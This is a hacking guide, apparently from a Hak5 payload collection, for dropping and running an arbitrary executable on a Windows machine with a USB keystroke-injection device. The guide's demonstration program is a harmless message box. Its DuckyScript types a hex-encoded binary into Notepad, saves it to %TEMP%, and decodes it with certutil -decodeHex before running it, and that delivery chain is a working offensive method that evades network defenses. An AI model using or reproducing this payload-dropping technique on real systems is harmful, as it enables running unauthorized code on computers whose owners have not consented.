# Install And Run Any Arbitrary Executable - No Internet And Root Needed

Through this guide you will be able to create executable programs that can be installed via DuckyScript in such a way as to avoid using the Internet altogether. This type of installation can lead to serious damage to machines so do it only if you are fully aware and sure of what you are doing, in this example you will already find the code in hexadecimal but if you want to be sure recompile the executable following the following guide.

Executables have been removed for security reasons.

**Category**: Execution

# Guide to Creating an Executable Program using Python

## Introduction

This guide provides detailed instructions on how to use Python to create an executable program, generate hexadecimal code, and automate the execution of the application trough DuckyScript. Practical example in assets directory.

## Creating the Python Program

To begin, create a Python program that performs the desired functionality. You can use any programming language of your choice, but for this guide, we'll be using Python.

```python
import ctypes

ctypes.windll.user32.MessageBoxW(None, "Hello Hak5!", 'Info', 0x10 | 0x1)
```

## Creating the Executable using PyInstaller

Once the Python program is ready, we can use PyInstaller to create an executable file. PyInstaller converts the Python program into a standalone executable that can be run on any compatible system without requiring Python to be installed.

Install PyInstaller using the following command:

```powershell
pip install pyinstaller
```

To create the executable, run the following command in the terminal:

```powershell
pyinstaller --onefile full/path/to/the/file/example.py
```

Replace `example.py` with the filename of your Python script. The `--onefile` flag ensures that the output is a single executable file. Remember that the executable file can be found within the path `dist/example.exe`.

## Generating Hexadecimal Code

Next, we'll generate the hexadecimal code from the executable file. This step is necessary if you intend to automate the execution of the program.

To generate the `hexadecimal` code, you can use various methods or libraries. In this case I decided to create another program in Python capable of doing this conversion, the partial code is as follows but you can find the entire file in the assets folder.

```python
# Rest of the code...
with open(filename, 'rb') as file:
    binary_data = file.read()
    hex_code = binascii.hexlify(binary_data).decode()
# ...
```

## Creating a DuckyScript to Automate Execution

To create the payload in DuckyScript you simply add the hexadecimal code inside a STRING command immediately after opening the notepad.

```duckyscript
DEFINE #HEX_CODE <hexadecimal_code>

DELAY 500
GUI r
DELAY 500
STRING notepad.exe
ENTER
DELAY 500
STRING #HEX_CODE

DELAY 2000
ALT F
DELAY 1000
STRING S
DELAY 1000
ALTSTRING "%TEMP%\script.hex"
```

Replace `<hexadecimal_code>` with the actual hexadecimal code generated in the previous step. I used a combo ALT F and STRING S for save the file using `"%TEMP%\script.hex"` that save it in a `TEMP` directory

## Decoding Hexadecimal Code and Executing the Program
Now, we need to decode the hexadecimal code and execute the program. We can use the `certutil` command to accomplish this.

Once saved the file with a hex extension, run the following command in the Command Prompt:

```powershell
certutil -f -decodeHex "%TEMP%\script.hex" "%TEMP%\script.exe"
```

Replace `script.exe` with the desired output filename for the decoded program.

Finally, run the executable on the computer, or any other compatible device, to open start execution of the program.

These are the steps required to create an executable program with Python, generate the hexadecimal code, and automate its execution. Feel free to modify the instructions to suit your specific needs or programming language preferences.

Happy Hacking!

## Credits

<h2 align="center"> Aleff :octocat: </h2>
<div align=center>
<table>
  <tr>
    <td align="center" width="96">
      <a href="https://github.com/aleff-github">
        <img src=https://github.com/aleff-github/aleff-github/blob/main/img/github.png?raw=true width="48" height="48" />
      </a>
      <br>Github
    </td>
    <td align="center" width="96">
      <a href="https://www.instagram.com/alessandro_greco_aka_aleff/">
        <img src=https://github.com/aleff-github/aleff-github/blob/main/img/instagram.png?raw=true width="48" height="48" />
      </a>
      <br>Instagram
    </td>
    <td align="center" width="96">
      <a href="https://www.linkedin.com/in/alessandro-greco-aka-aleff/">
        <img src=https://github.com/aleff-github/aleff-github/blob/main/img/linkedin.png?raw=true width="48" height="48" />
      </a>
      <br>Discord
    </td>
  </tr>
</table>
</div>
